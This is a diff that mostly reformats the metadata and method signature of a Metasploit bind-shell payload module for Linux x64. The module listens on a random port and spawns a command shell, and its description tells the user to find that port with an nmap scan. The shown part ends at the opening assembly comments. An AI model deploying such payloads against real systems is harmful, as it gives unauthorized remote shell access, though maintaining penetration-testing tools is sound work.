@@ -4,29 +4,31 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 51
 
   include Msf::Payload::Single
   include Msf::Payload::Linux::X64::Prepends
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
-      'Description'   => %q{
-        Listen for a connection in a random port and spawn a command shell.
-        Use nmap to discover the open port: 'nmap -sS target -p-'.
-      },
-      'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',
-      'License'       => BSD_LICENSE,
-      'References'    => [['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm']],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Bind TCP Random Port Inline',
+        'Description' => %q{
+          Listen for a connection in a random port and spawn a command shell.
+          Use nmap to discover the open port: 'nmap -sS target -p-'.
+        },
+        'Author' => 'Geyslan G. Bem <geyslan[at]gmail.com>',
+        'License' => BSD_LICENSE,
+        'References' => [['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm']],
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64
+      )
+    )
   end
 
-  def generate(opts={})
-    payload = %Q^
+  def generate(_opts = {})
+    payload = %^
       ; Creating the socket file descriptor
       ; int socket(int domain, int type, int protocol);
       ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
